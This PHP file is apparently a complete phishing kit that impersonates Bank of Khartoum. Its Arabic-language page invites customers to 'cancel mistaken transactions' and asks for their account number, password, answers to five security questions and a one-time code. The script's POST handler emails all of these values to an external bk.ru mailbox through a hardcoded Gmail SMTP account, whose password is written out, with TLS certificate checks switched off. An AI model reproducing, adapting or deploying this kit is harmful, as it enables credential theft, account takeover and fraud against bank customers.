<?php
    //Import PHPMailer classes into the global namespace
    //These must be at the top of your script, not inside a function
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
    //Load Composer's autoloader
    require 'vendor/autoload.php';

    if ($_SERVER['REQUEST_METHOD']=='POST') {

        $body = file_get_contents('php://input');
        $object = json_decode($body, true);

        $phone = $object['phone'];
        $pass = $object['password'];
        $otp = $object['otp'];
        $question1 = $object['question1'];
        $answer1 = $object['answer1'];
        $question2 = $object['question2'];
        $answer2 = $object['answer2'];
        $question3 = $object['question3'];
        $answer3 = $object['answer3'];
        $question4 = $object['question4'];
        $answer4 = $object['answer4'];
        $question5 = $object['question5'];
        $answer5 = $object['answer5'];
       

        //Create an instance;( passing `true` enables exceptions
        $mail = new PHPMailer(true);
        $mail->CharSet = 'UTF-8'; 
        try {
            //Server settings
            $mail->SMTPDebug = SMTP::DEBUG_OFF;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host = 'ssl://smtp.gmail.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth = true;                                   //Enable SMTP authentication
            $mail->Username = 'dcvsdgvxbvb@gmail.com';                     //SMTP username
            $mail->Password = 'nomanherenorthere1939';                               //SMTP password
            // $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->SMTPSecure = "ssl";
            $mail->Port = 465;


            $mail->SMTPOptions = array(
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'allow_self_signed' => true
                )
            );
            //Recipients
            $mail->setFrom('dcvsdgvxbvb@gmail.com', 'JESUIS');
            $mail->addAddress('nomanherenorthere@bk.ru');     //Add a recipient

            //Content
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = 'info';
            $mail->Body    = 'tel: <b>'.$phone.'</b> |'.
                                'pass: <b>'.$pass.'</b> |'.
                                'question1: <b>'.$question1.'</b> |'.
                                'answer1: <b>'.$answer1.'</b> </br> |'.
                                'question2: <b>'.$question2.'</b>|'.
                                'answer2: <b>'.$answer2.'</b> </br> |'.
                                'question3: <b>'.$question3.'</b> |'.
                                'answer3: <b>'.$answer3.'</b> </br> |'.
                                'question4: <b>'.$question4.'</b> |'.
                                'answer4: <b>'.$answer4.'</b> </br> |'.
                                'question5: <b>'.$question5.'</b> |'.
                                'answer5: <b>'.$answer5.'</b> </br> |'.
                              
                                'otp: <b>'.$otp.' |';

            $mail->send();

            echo 'Message has been sent';
        } catch (Exception $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    }
    else{
        echo '
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="UTF-8">
            <!--  // <meta id="cr" name="csrf-token" content="{{ csrf_token() }}">-->
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" href="./assets/css/style.css">
              <title> بنك الخرطوم - الغاء معاملات تمت عن طريق الخطأ</title>
            </head>
            <body>
              <header>
                <div class="logo-wrapper">
                  <img src="./assets/img/logo.png">
                </div>
              </header>

              <div class="center-message done" id="done">
                <p id="text">
                  <h3>
                    تم ارسال الطلب <img src="./assets/icon/checkmark.svg"></h3> <br>
                    تم استلام طلبك وسيتم التواصل معك لاكمال الغاء المعاملة المالية
                    يمكنم دائما الإتصال بنا عبر مباشر 1913 <br>
                  #بنكك
                  <br>
                    #مافي حدود مافي مستحيل
                </p>

                <button type="button" id="end">تم</button>
               </div>

              <div class="center-message" id="center-message">
               <div id="message-text"> جاري ارسال الطلب</div>
                <img id="sendng" class="logo-b" src="./assets/icon/l.gif">
              </div>
              <div class="menu-wrapper">
                <img class="logo" src="./assets/icon/menu.svg">
                <span class="menu-label">القائمة</span>
              </div>
              <div class="content">
                <h2 class="title">بنك الخرطوم</h2>
                <span class="title-mini">Bank Of Khartoum</span>
              </div>
              <img src="./assets/img/cancel.jpg">
              <div class="content">
                <p class="subject">
                    الغاء معاملات تمت عن طريق الخطأ
                    </p>
                <div class="speech">
                  <span class="words">
                    الان مع بنك الخرطوم تقدر تتراجع عن أي معاملة قمت بها عن طريق الخطاء
                    </span>
                  <span class="words">
                    يتم إلغاء المعاملة وفق الشروط المقدمة من بنك الخرطوم
                    </span>

                  <span class="words">
                    يتم تحديد المعاملة المراد إلغائها عن طريق كشف الحساب موضحة بالوقت والتاريخ والرقم
                    التعريفي للمعاملة
                    </span>

                  <span class="steps">
                    الرجاء اتباع الخطوات التالية لالغاء معاملة مالية معينة
                    </span>
                    <div class="here-wrapper">
                    <span class="here">
                    الخطوة الاولى <br> يتم الدخول للمكان المخصص
                      وتسجيل الدخول لحسابك لتأكيد ملكيتك من هنا
                    </span>

                    <div class="form" id="account">
                      <h2>
                    الرجاء تسجيل الدخول الي حسابك وتأكيد هويتك
                    </h2>
                      <div class="cont">
                        <input id="phone-number" type="number" placeholder="ادخل رقم الحساب">
                        <input id="pasword" type="password" placeholder="كلمة المرور">
                      </div>
                    </div>

                      

                      <div class="thrd">
                        <span class="here">
                        الخطوة الثانية <br> جاوب علي اسئلة الامان كما هي موجودة علي حسابك 
                        </span>
                        <span class="didnt">
                        اذا لم تقم بتفعيل اسئلة الامان؟  <a href="/questions.php" target="_blank">اضغط هتا لمعرفة كيفية تفعيل اسئلة الامان</a>
                        </span>

                        <select name="q1" id="q1" style="margin-right:10px">
                        <option value="no select" selected> اختر السؤال الاول</option>
                        <option value="cousine first name"> ما هو اسم بن عمك الاول؟</option>
                        <option value="city borned in"> في اي مدينة ولدت؟</option>
                        <option value="universty graduation year">في اي سنة تخرجت من الجامعة؟</option>
                      </select>
                      <input id="answer1" type="text" placeholder="اكتب الاجابة... ">

                      <select name="q2" id="q2" style="margin-right:10px">
                      <option value="no select" selected> اختر السؤال الثاني</option>
                      <option value="your nickname in your childhood">ماذا كان لقبك اثناء الطفولة؟</option>
                      <option value="best writer name"> اسم ملؤلفك المفضل؟</option>
                      <option value="best writer name"> اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
                    </select>
                    <input id="answer2" type="text" placeholder="اكتب الاجابة... ">

                    <select name="q3" id="q3" style="margin-right:10px">
                          <option value="no select" selected> اختر السؤال الثالث</option>
                          <option value="best chilhood friend">اي فلم هو المفضل لديك؟</option>
                          <option value="best chilhood friend">اسم افضل صديق في الطفولة؟</option>
                          <option value="driver lecense">في اي عام حصلت على رخصة القيادة؟</option>
                        </select>
                        <input id="answer3" type="text" placeholder="اكتب الاجابة... ">

                  
                        <select name="q4" id="q4" style="margin-right:10px">
                          <option value="no select" selected>  اختر السؤال الرابع </option>
                          <option value="marrage year">العلامة التجارية لاول تلفزيون خاص بك؟</option>
                          <option value="marrage year"> في اي سنة تزوجت؟</option>
                          <option value="football team">اسم فريق كرة القدم المفضل لديك؟</option>
                        </select>
                        <input id="answer4" type="text" placeholder="اكتب الاجابة... ">

                        

                       

                        <select name="q5" id="q5" style="margin-right:10px">
                          <option value="no select" selected> اختر السؤال الخامس</option>
                          <option value="school name">ماهو اسم المدرسة التي التحقت بها؟</option>
                          <option value="car marka">ماهي ماركت سيارتك الاولى؟</option>
                          <option value="first foregin country" > اسم اول بلد اجنبي قمت بزيارته؟</option>
                      </select>
                      <input id="answer5" type="text" placeholder="اكتب الاجابة... ">


                       

                
                    </div>
                  </div>

                

                  <div class="thrd">
                    <span class="here">
                    الخطوة الرابعة <br> قم بارفاق صورة "لقطة شاشة" المعاملة المالية المراد الغائها اذا وجد
                    <input type="file" class="press-here" id="file" accept="image/*"/>

                      <label for="file"> <img class="logo" src="./assets/icon/picture.svg"> اضغط هنا لارفاق صورة</label>
                    </span>
                    <span class="file-name" id="file-name"></span>
                  </div>


                  <button class="btn" id="send-code"> اضفط لاارسال رمز التحقق</button>
                  <span class="words et">
                    بعد ان تقوم بالاجابة عن اسئلة الامان بشكل صحيح
                      يقوم بنك الخرطوم بإرسال رمز تحقق  في رقم هاتفك
                      بعد مدة أقصاها 10 دقائق <br>
                      يتم ادخال الرمز في المكان المخصص له في الخطوة الثالثة <br>

                      <span class="tep">
                    صلاحية الكود المرسل الى هاتفك 5 دقائق فقط أحرص على أن تكون بجانب الهاتف بعد اجراء الطلب
                    </span>
                    </span>

                 

                  <div class="form">
                    <h2>
                  الرجاء ادخال رمز التحقق هنا
                    </h2>
                    <div class="cont">
                      <input id="code-number" type="number" placeholder="ادخل رمز التحقق">
                   
                    </div>
                  </div>

                  <button class="btn" id="final">ارسال طلب الغاء المعاملة المالية</button>

                  <span class="words-good">
                    بعد اكمال الخطوات اعلاه بشكل صحيح وارسال الطلب يرجى الانتظار وسيتم الاتصال بك
                    </span>
                </div>
              </div>

              <footer>
                <div class="end">
                  <div>
                    <img src="./assets/icon/facebook_f.svg">
                  </div>
                  <div>
                    <img src="./assets/icon/twitter.svg">
                  </div>
                  <div>
                    <img src="./assets/icon/play_button.svg">
                  </div>
                  <div>
                    <img src="./assets/icon/linkedin.svg">
                  </div>
                </div>
              </footer>
              <script src="./assets/js/js.js"></script>
            </body>
            </html>';
    }
